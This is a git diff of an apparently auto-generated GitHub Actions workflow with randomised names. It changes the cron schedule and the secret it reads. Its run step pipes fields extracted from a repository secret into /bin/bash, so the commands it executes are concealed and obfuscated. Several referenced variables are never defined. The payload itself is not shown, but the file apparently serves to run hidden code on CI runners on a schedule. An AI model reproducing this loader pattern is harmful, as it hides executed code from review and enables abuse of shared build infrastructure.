@@ -1,8 +1,9 @@
 name: gechundan5678
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 5/6 * * *'
+    - cron: '50 4/6 * * *'
 
 jobs:
   build:
@@ -12,18 +13,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: gechundan5678
         env:
-          g09: ${{ secrets.g09 }}
+          mm6: ${{ secrets.mm6 }}
         run: |
-          echo $g09 | jq -r .xbaw0424 | /bin/bash
-          echo $rhbmh5 | jq -r .uhcd3769 | /bin/bash
-          echo $t457 | jq -r .hwlf64558 | /bin/bash
-          echo $dhf83 | jq -r .lktg700 | /bin/bash
-          echo $fqsy437 | jq -r .pe81150 | /bin/bash
-          echo $lp42857 | jq -r .c468 | /bin/bash
-          echo $o2400 | jq -r .vd824 | /bin/bash
-          echo $uhz98 | jq -r .an24154 | /bin/bash
-          echo $jrfd18663 | jq -r .bbwb55626 | /bin/bash
-          echo $sie31215 | jq -r .f6116 | /bin/bash
-          echo $xdh5 | jq -r .nty58426 | /bin/bash
-          echo $jysn1379 | jq -r .uy1343 | /bin/bash
+          echo $mm6 | jq -r .gvm132 | /bin/bash
+          echo $t6366 | jq -r .ir12382 | /bin/bash
+          echo $yiqhz90 | jq -r .uo76 | /bin/bash
+          echo $ej29378 | jq -r .pcfr5 | /bin/bash
+          echo $a33 | jq -r .gutm60633 | /bin/bash
+          echo $d114 | jq -r .lhd43 | /bin/bash
+          echo $q8248 | jq -r .tu67444 | /bin/bash
+          echo $eqnd5 | jq -r .wz03 | /bin/bash
 
